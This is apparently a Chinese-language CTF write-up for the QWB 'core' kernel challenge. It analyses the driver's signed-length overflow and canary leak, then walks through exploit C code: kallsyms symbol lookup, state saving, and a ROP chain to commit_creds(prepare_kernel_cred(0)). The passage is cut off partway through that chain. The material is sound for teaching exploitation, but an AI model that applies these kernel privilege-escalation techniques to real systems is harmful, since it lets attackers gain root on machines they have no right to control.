<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>pwndbg&gt; add-symbol-file ./core/core.ko 0xffffffffc028b000
add symbol table from file &quot;./core/core.ko&quot; at
    .text_addr = 0xffffffffc028b000
Reading symbols from ./core/core.ko...(no debugging symbols found)...done.
</code></pre><p>在core驱动下断</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>pwndbg&gt; b core_read
</code></pre><p>远程调试</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>target remote localhost:1234
c
</code></pre><h3 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">core_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>

  v3 <span class="token operator">=</span> a3<span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>a2 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889B</span><span class="token punctuation">:</span>
      <span class="token function">core_read</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889C</span><span class="token punctuation">:</span>
      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2CD<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      off <span class="token operator">=</span> v3<span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889A</span><span class="token punctuation">:</span>
      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B3<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">core_copy_func</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以看到这是自行定义的ioctl、并且全局变量可控<br>传入 0x6677889A进入core_copy_func函数<br>传入 0x6677889B 进入 core_read函数<br>传入  0x6677889C 设置off参数</p>
<h3 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">core_copy_func</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_215<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">></span> <span class="token number">63</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2A1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token function">qmemcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>注意qmemcpy这里<br>在执行前 定义 signed <strong>int64 a1 但是在执行时unsigned </strong>int16)a1</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>signed和unsigned用于修饰整数类型（包括char，从ANSI C89标准开始支持）。
signed表示有符号，unsigned表示无符号。对应的有符号数的最大取值要比无符号的小约一半，因为最高一位被用来表示符号。
默认的int、short、long、long long为有符号数，也就是说，int等价于signed int，short等价于signed short，long等价于signed long，long long等价于signed long long。但是char本身是signed char还是unsigned char，取决于语言的实现（编译器）。
范围列表如下：
signed char：[-2^7, 2^7)即[-128, 128)；验证
unsigned char：[0, 2^8)即[0, 256)；
signed n位整数：[-2^(n-1), 2^(n-1))；
unsigned n位整数：[0, 2^n)。
注意整数类型占多少空间是不确定的，只能保证sizeof(shor)&lt;=sizeof(int)&lt;=sizeof(long)。一般32位平台上，int和long为32位，short为16位，long long为64位
</code></pre><p>所以这里可以传入负数导致溢出   因为需要利用溢出所以我们只需要控制构造长度为0xf000000000000300，即可成功覆盖RIP<br>因为没有开启smep 所以可以利用ret2user在用户态下提权或者在内核态rop进行提权<br>常见提权命令</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">core_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
  __int64 <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>
  <span class="token keyword">signed</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>
  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>

  v2 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_25B<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_275<span class="token punctuation">,</span> off<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">16LL</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token string">"Welcome to the QWB CTF challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> off<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>
  __asm <span class="token punctuation">{</span> swapgs <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>注意到result这里 执行了copy_to_user（）函数</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>在学习Linux内核驱动的时候，经常会碰到copy_from_user和copy_to_user这两个函数，设备驱动程序中的ioctl函数就经常会用到。这两个函数负责在用户空间和内核空间传递数据
</code></pre><p>查看下他们的定义</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">copy_from_user：

<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> __user <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_READ<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
        n <span class="token operator">=</span> <span class="token function">__arch_copy_from_user</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token comment" spellcheck="true">/* security hole - plug it */</span>
        <span class="token function">memzero</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> n<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


copy_to_user：

 <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_WRITE<span class="token punctuation">,</span> to<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
           n <span class="token operator">=</span> <span class="token function">__copy_to_user</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> n<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
</code></pre>
<p>其中函数的三个参数含义为：<em>to是内核空间的指针，</em>from是用户空间指针，n表示从用户空间想内核空间拷贝数据的字节数。如果成功执行拷贝操作，则返回0，否则返回还没有完成拷贝的字节数</p>
<h3 id="—————————————"><a href="#—————————————" class="headerlink" title="—————————————"></a>—————————————</h3><p>其中access_ok()是</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">ifdef</span> CONFIG_MMU</span>
  <span class="token macro property">#<span class="token directive keyword">define</span> access_ok(type,addr,size) (likely(__range_ok(addr,size) == 0))</span>
<span class="token macro property">#<span class="token directive keyword">else</span></span>
  <span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">access_ok</span><span class="token punctuation">(</span><span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
  <span class="token keyword">extern</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> memory_start<span class="token punctuation">,</span> memory_end<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> val <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">>=</span> memory_start<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> memory_end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
</code></pre>
<p>返回再看函数</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">result <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> off<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>查看下汇编</p>
<p></p><p class="code-caption" data-lang="asm" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-asm"><code class="language-asm">.text:00000000000000AB                 mov     rsi, offset src ; "Welcome to the QWB CTF challenge.\n"
.text:00000000000000B2                 mov     rdi, rsp        ; dest
.text:00000000000000B5                 call    strcpy
.text:00000000000000BA                 mov     rsi, rsp
.text:00000000000000BD                 add     rsi, cs:off
.text:00000000000000C4                 mov     edx, 40h ; '@'
.text:00000000000000C9                 mov     rdi, rbx
.text:00000000000000CC                 call    _copy_to_user
.text:00000000000000D1                 test    rax, rax
.text:00000000000000D4                 jz      short loc_DB
</code></pre>
<p>看到v6其实就是rsp 而off又是我们可以控制设置的 传入 0x6677889C  ，所以利用好这个点 可以leak canary（从0位开始获取）以及内核函数地址</p>
<p>canary = rsp+ 0x40<br>所以设置off为0x40</p>
<p>程序基本分析完毕<br>1.存在溢出 可以利用执行rop<br>2.off可控 利用v6+off leak canary<br>3.因为给出静态vmlinux //可以直接在此中查找gadget</p>
<ol>
<li>给出vmlinux 并且启动环境后会将/proc/kallsyms写入tmp/ kallsyms查找commit_creds，prepare_kernel_cred<br>5.虽然开启了kaslr 但是可以通过commit_creds，prepare_kernel_cred 计算出找vmlinux base</li>
</ol>
<p>利用ropgadget提取gadget 过于缓慢 …(CTFwiki suggest use Ropper)<br>所以我们用Ropper提取gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player ropper --file ./vmlinux --nocolor <span class="token operator">></span> g1
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Load gadgets from cache
<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> loading<span class="token punctuation">..</span>. 100%
<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> removing double gadgets<span class="token punctuation">..</span>. 100%
</code></pre>
<h3 id="offset-计算exp"><a href="#offset-计算exp" class="headerlink" title="offset 计算exp"></a>offset 计算exp</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player checksec vmlinux
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/kernel/croe/give_to_player/vmlinux'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0xffffffff81000000<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#raw_vmlinux_base</span>
    RWX:      Has RWX segments
</code></pre>
<pre class=" language-C"><code class="language-C">#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;
size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            /* puts(buf); */
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            /* printf("hex: %s\n", hex); */
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);

            vmlinux_base = commit_creds - 0x9c8e0;
            printf("vmlinux_base addr: %p\n", vmlinux_base);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            /* puts(buf); */
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
            /* printf("vmlinux_base addr: %p\n", vmlinux_base); */
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

}
int main(void){

find_symbols();
unsigned long long offset = vmlinux_base - raw_vmlinux_base;
printf("{==dbg==} leak offset: %p\n",(void*)offset);
}
<p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p>
</code></pre>
<h3 id="平衡堆栈"><a href="#平衡堆栈" class="headerlink" title="平衡堆栈"></a>平衡堆栈</h3><p>就像刚开始说的一样 内核态与用户态pwn的差别  内核态还需要稳定堆栈<br>在内核返回用户态的时候，会调用iretq，iretq会依次弹出 rip cs eflags rsp ss之后做一些判断，如果不能构造好这些参数，系统会崩溃<br>这里采取提前保存的方式来稳定堆栈</p>
<pre class=" language-C"><code class="language-C">static void save_state() {
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}
</code></pre>
<h3 id="Set-off-and-Leak-canary"><a href="#Set-off-and-Leak-canary" class="headerlink" title="Set off and Leak canary"></a>Set off and Leak canary</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token macro property">#use to fake stack</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} set off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889C</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#set off =0x40</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy to user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889b</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#set case = 0x6677889b into core_read than leak canary</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} canary: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>有了cananry 就可以构造rop了</p>
<h3 id="ROP-to-getshell-and-ret-user"><a href="#ROP-to-getshell-and-ret-user" class="headerlink" title="ROP to getshell and ret user"></a>ROP to getshell and ret user</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> rop_buf<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>rop_buf<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//rbx</span>
    <span class="token comment" spellcheck="true">//ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81000b2f</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdi ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109cce0</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//prepare_kernel_cred</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff810a0f49</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdx ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109c8e0</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//commit_creds</span>
